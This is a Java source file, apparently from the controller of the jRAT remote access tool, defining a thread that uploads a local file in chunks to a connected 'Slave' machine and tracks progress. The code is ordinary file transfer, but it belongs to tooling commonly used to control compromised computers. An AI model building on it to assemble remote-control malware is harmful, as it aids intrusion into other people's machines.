package se.jrat.client.threads;

import java.io.File;
import java.io.FileInputStream;

import se.jrat.client.Slave;
import se.jrat.client.packets.outgoing.Packet103CompleteServerUpload;
import se.jrat.client.packets.outgoing.Packet104ServerUploadPart;
import se.jrat.client.ui.panels.PanelFileTransfers;
import se.jrat.common.TransferRunnable;
import se.jrat.common.io.TransferData;

public class UploadThread extends TransferRunnable {
	
	private Slave slave;
	
	public UploadThread(Slave slave, String remoteFile, File file) {
		this.slave = slave;
		
		data = new TransferData();
		PanelFileTransfers.instance.add(data);
		data.setRemoteFile(remoteFile);
		data.setLocalFile(file);
		data.setTotal(file.length());
		data.setObject(slave);
		
		data.setRunnable(this);
	}
	
	public UploadThread(TransferData data) {
		super(data);
	}
	
	@Override
	public void run() {
		try {	
			File file = data.getLocalFile();
			String remoteFile = data.getRemoteFile();
			
			FileInputStream fileInput = new FileInputStream(file);
			byte[] chunk = new byte[1024 * 8];

			for (long pos = 0; pos < file.length(); pos += 1024 * 8) {
				if (pause) {
					try {
						Thread.sleep(Long.MAX_VALUE);
					} catch (InterruptedException e) {

					}
				}
				
				if (Thread.interrupted() || !slave.isConnected()) {
					fileInput.close();
					return;
				}

				int read = fileInput.read(chunk);
				
				slave.addToSendQueue(new Packet104ServerUploadPart(remoteFile, chunk, read));
											
				data.increaseRead(read);
				PanelFileTransfers.instance.update();
			}
			
			fileInput.close();
			
			data.setState(TransferData.State.COMPLETED);
			onComplete();
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}
	
	public void onComplete() {
		slave.addToSendQueue(new Packet103CompleteServerUpload(data.getRemoteFile()));
	}

	public void setSlave(Slave slave) {
		this.slave = slave;
	}

}
